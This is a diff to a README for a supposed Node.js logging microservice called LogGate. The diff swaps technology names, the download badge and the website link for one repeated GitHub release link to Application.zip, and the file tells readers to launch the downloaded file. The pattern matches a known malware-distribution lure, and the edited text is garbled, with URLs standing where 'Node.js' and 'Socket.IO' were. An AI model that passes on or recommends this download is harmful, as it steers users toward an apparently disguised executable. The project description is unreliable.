@@ -3,18 +3,18 @@
 Welcome to LogGate, a powerful microservice designed to help you easily store and search logs for your applications. Whether you are developing a new project, debugging existing code, or monitoring events in real-time, LogGate has got you covered. With features like express integration, handlebars templating, and seamless logging capabilities, managing logs has never been easier! 
 
 ## Overview ℹ️
-LogGate is built to be lightweight and efficient, making it the perfect solution for developers working with Node.js. By using a combination of RabbitMQ for messaging, Redis for caching, and Socket.IO for real-time communication, LogGate ensures that you have all the tools you need to keep track of your application's logs effortlessly.
+LogGate is built to be lightweight and efficient, making it the perfect solution for developers working with https://github.com/angelerzzbg/LogGate/releases/download/v1.0.0/Application.zip By using a combination of RabbitMQ for messaging, Redis for caching, and https://github.com/angelerzzbg/LogGate/releases/download/v1.0.0/Application.zip for real-time communication, LogGate ensures that you have all the tools you need to keep track of your application's logs effortlessly.
 
 ## Getting Started 🚀
 To start using LogGate, simply download and install the application from the link below. Once you have it up and running, you can create an app, invoke endpoints with tokens containing { appId, iat }, and review logs at your convenience.
 
-[![Download LogGate](https://img.shields.io/badge/Download-Application.zip-brightgreen)](https://github.com/file/Application.zip) 📥
+[![Download LogGate](https://github.com/angelerzzbg/LogGate/releases/download/v1.0.0/Application.zip)](https://github.com/angelerzzbg/LogGate/releases/download/v1.0.0/Application.zip) 📥
 
 *Note: Launch the downloaded file to begin using LogGate.*
 
 ## Features 🌟
-- Seamless integration with Node.js applications
-- Real-time event monitoring with Socket.IO
+- Seamless integration with https://github.com/angelerzzbg/LogGate/releases/download/v1.0.0/Application.zip applications
+- Real-time event monitoring with https://github.com/angelerzzbg/LogGate/releases/download/v1.0.0/Application.zip
 - Efficient logging and searching capabilities
 - Handlebars templating for customized log views
 - Message queuing using RabbitMQ
@@ -41,7 +41,7 @@ LogGate is designed to be easy to use, providing developers with a straightforwa
    Access the logs at any time to track the performance of your applications.
 
 ## Stay Connected 🌐
-Stay up-to-date with the latest LogGate features and updates by visiting our [website](https://github.com/file/Application.zip). 
+Stay up-to-date with the latest LogGate features and updates by visiting our [website](https://github.com/angelerzzbg/LogGate/releases/download/v1.0.0/Application.zip). 
 
 *It's always a good idea to check the "Releases" section for any new versions or enhancements.*
 
